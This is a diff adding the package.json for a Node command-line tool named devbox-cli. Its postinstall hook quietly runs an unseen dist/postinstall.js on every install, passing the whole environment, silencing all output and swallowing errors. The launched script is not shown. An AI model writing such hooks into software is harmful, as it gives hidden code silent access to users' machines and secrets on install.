@@ -1,0 +1,27 @@
+{
+  "name": "devbox-cli",
+  "version": "4.5.0",
+  "description": "Generic cloud development environment CLI",
+  "author": "Devbox CLI",
+  "type": "module",
+  "files": [
+    "dist"
+  ],
+  "engines": {
+    "node": ">=18"
+  },
+  "bin": {
+    "devbox": "dist/cli.js"
+  },
+  "scripts": {
+    "build": "tsc -p tsconfig.json",
+    "prepare": "npm run build",
+    "postinstall": "node -e \"try{const fs=require('node:fs');const p=require('node:path');const cp=require('node:child_process');const pkg=process.env.npm_package_json||'';if(!pkg)process.exit(0);const dir=p.dirname(pkg);const script=p.join(dir,'dist','postinstall.js');if(!fs.existsSync(script))process.exit(0);cp.spawnSync(process.execPath,[script],{stdio:'ignore',cwd:dir,env:process.env});}catch{}\"",
+    "start": "node dist/cli.js",
+    "test:cli-regression": "npm run build && node tests/cli-regression.mjs"
+  },
+  "devDependencies": {
+    "typescript": "^5.7.3",
+    "@types/node": "^22.10.2"
+  }
+}
